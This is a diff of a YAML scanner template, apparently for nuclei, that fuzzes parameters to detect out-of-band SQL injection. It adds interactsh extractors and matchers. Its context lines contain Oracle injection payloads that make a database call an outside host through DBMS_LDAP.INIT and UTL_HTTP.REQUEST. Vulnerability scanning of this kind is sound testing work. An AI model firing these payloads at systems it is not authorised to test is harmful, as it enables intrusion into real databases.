@@ -1,5 +1,11 @@
 http:
-- fuzzing:
+- extractors:
+  - group: 1
+    part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  fuzzing:
   - fuzz:
     - '{{oob_payloads}}'
     mode: single
@@ -8,8 +14,13 @@ http:
   - part: interactsh_protocol
     type: word
     words:
-    - http
     - dns
+    - http
+  - part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  matchers-condition: and
   method: GET
   path:
   - '{{BaseURL}}'
@@ -42,6 +53,7 @@ http:
     - 1"; BEGIN DBMS_LDAP.INIT('ldap.{{interactsh-url}}', 80); END;--
     - 1 SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle') FROM DUAL--
     - 1 BEGIN DBMS_LDAP.INIT('ldap.{{interactsh-url}}', 80); END;--
+  stop-at-first-match: true
 id: fuzz-oob-all
 info:
   author: openai
